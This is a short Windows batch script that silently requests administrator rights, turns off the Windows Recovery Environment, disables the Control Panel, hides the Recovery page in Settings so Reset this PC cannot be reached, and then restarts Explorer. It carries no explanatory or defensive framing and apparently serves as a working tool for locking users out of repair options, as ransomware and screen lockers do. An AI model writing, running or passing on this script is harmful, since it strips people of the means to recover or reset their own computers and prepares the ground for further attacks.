@echo off
:: Check for Administrator privileges silently
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Disable Windows Recovery Environment (WinRE)
reagentc /disable >nul 2>&1

:: Disable Control Panel by setting NoControlPanel to 1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f >nul 2>&1

:: Hide the "Recovery" page in Settings (prevents access to Reset this PC UI)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v SettingsPageVisibility /t REG_SZ /d "hide:recovery" /f >nul 2>&1

:: Force restart Windows Explorer to apply changes
taskkill /F /IM explorer.exe >nul 2>&1
start explorer.exe
